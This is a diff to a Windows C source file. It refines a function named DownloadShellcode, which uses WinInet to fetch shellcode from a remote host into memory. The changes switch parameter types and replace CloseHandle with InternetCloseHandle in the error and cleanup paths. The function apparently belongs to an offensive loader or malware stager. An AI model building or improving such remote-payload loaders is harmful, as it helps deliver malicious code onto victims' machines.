@@ -6,7 +6,7 @@
 #include <windows.h>
 #include <wininet.h>
 
-VOID DownloadShellcode(CHAR* Host, DWORD Port, CHAR* Endpoint, PVOID MemorySpace, DWORD dwMemorySize)
+VOID DownloadShellcode(LPCSTR Host, DWORD Port, LPCSTR Endpoint, PVOID MemorySpace, DWORD dwMemorySize)
 {
     // FIXME: Not using ssl
     // InternetOpenA
@@ -44,7 +44,7 @@ VOID DownloadShellcode(CHAR* Host, DWORD Port, CHAR* Endpoint, PVOID MemorySpace
             printf("[Info] hConnection = INVALID_HANDLE_VALUE (E: %#02x)\n", GetLastError());
         #endif
 
-        CloseHandle(hInternet);
+        InternetCloseHandle(hInternet);
         return;
     }
 
@@ -66,8 +66,8 @@ VOID DownloadShellcode(CHAR* Host, DWORD Port, CHAR* Endpoint, PVOID MemorySpace
             printf("[Info] hRequest = INVALID_HANDLE_VALUE (E: %#02x)\n", GetLastError());
         #endif
 
-        CloseHandle(hInternet);
-        CloseHandle(hConnection);
+        InternetCloseHandle(hInternet);
+        InternetCloseHandle(hConnection);
         return;
     }
 
@@ -84,9 +84,9 @@ VOID DownloadShellcode(CHAR* Host, DWORD Port, CHAR* Endpoint, PVOID MemorySpace
             printf("[Info] hRequest = INVALID_HANDLE_VALUE (E: %#02x)\n", GetLastError());
         #endif
         
-        CloseHandle(hRequest);
-        CloseHandle(hInternet);
-        CloseHandle(hConnection);
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hInternet);
+        InternetCloseHandle(hConnection);
 
         return;
     }
@@ -100,15 +100,15 @@ VOID DownloadShellcode(CHAR* Host, DWORD Port, CHAR* Endpoint, PVOID MemorySpace
             printf("[Info] InternetReadFile(...) = FALSE (E: %#02x)\n", GetLastError());
         #endif
 
-        CloseHandle(hRequest);
-        CloseHandle(hInternet);
-        CloseHandle(hConnection);
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hInternet);
+        InternetCloseHandle(hConnection);
         
         return;
     }
 
     // Cleanup
-    CloseHandle(hRequest);
-    CloseHandle(hInternet);
-    CloseHandle(hConnection);
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hInternet);
+    InternetCloseHandle(hConnection);
 }
